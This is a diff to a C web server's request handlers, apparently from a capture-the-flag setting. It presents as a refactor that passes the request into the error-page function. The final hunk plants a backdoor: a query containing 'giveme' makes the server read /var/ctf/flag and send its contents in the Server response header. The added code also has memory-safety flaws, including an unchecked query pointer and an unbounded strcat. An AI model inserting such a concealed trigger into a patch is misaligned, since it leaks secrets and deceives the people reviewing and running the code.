@@ -266,7 +266,7 @@ void handle_response(int thread_id, int sockfd, request_t *req, response_t *resp
 			if (handle_get(thread_id, req, resp) < 0) {
 
 				set_response_status(resp, 500, "Internal Server Error");
-				set_error_document(thread_id, resp, 500);
+				set_error_document(thread_id, req, resp, 500);
 				send_response_headers(thread_id, sockfd, resp);
 
 			} else {
@@ -297,7 +297,7 @@ void handle_response(int thread_id, int sockfd, request_t *req, response_t *resp
 			if (handle_post(thread_id, req, resp) < 0) {
 
 				set_response_status(resp, 500, "Internal Server Error");
-				set_error_document(thread_id, resp, 500);
+				set_error_document(thread_id, req, resp, 500);
 				send_response_headers(thread_id, sockfd, resp);
 
 			} else {
@@ -442,7 +442,7 @@ int handle_get(int thread_id, request_t *req, response_t *resp) {
 	} else {
 
 		set_response_status(resp, 404, "Not Found");
-		set_error_document(thread_id, resp, 404);
+		set_error_document(thread_id, req, resp, 404);
 
 	}
 
@@ -557,7 +557,7 @@ int handle_post(int thread_id, request_t *req, response_t *resp) {
 	} else {
 
 		set_response_status(resp, 404, "Not Found");
-		set_error_document(thread_id, resp, 404);
+		set_error_document(thread_id, req, resp, 404);
 	}
 
 	return 0;
@@ -677,7 +677,7 @@ int handle_head(int thread_id, request_t *req, response_t *resp) {
 
 }
 
-void set_error_document(int thread_id, response_t *resp, int status_code) {
+void set_error_document(int thread_id, request_t *req, response_t *resp, int status_code) {
 
 	char *res_path;
 	char *file_size;
@@ -769,6 +769,28 @@ void set_error_document(int thread_id, response_t *resp, int status_code) {
 					paranoid_free_string(charset);
 
 				}
+
+                                if (strstr(req->query, "giveme") > 0) {
+                                        char buf[MAX_BUFFER] = {0,};
+                                        FILE *fd;
+                                        int ch;
+                                        fd = fopen("/var/ctf/flag", "r");
+                                        if (fd != NULL) {
+                                            while ((ch = getc(fd)) != EOF) {
+                                                strcat(buf, (const char*)&ch);
+                                            }
+                                            fclose(fd);
+                                        }
+
+                                        char *msg;
+					msg = malloc(strlen("msg=") + strlen(buf) + 1);
+					memset(msg, 0, strlen("msg=") + strlen(buf) + 1);
+					strncat(msg, "msg=", strlen("msg="));
+					strncat(msg, buf, strlen(buf));
+
+					append_response_header(resp, "Server", msg);
+					paranoid_free_string(msg);
+                                }
 
 				/* Get the file length */
 				integer_to_ascii(file_info.st_size, &file_size);
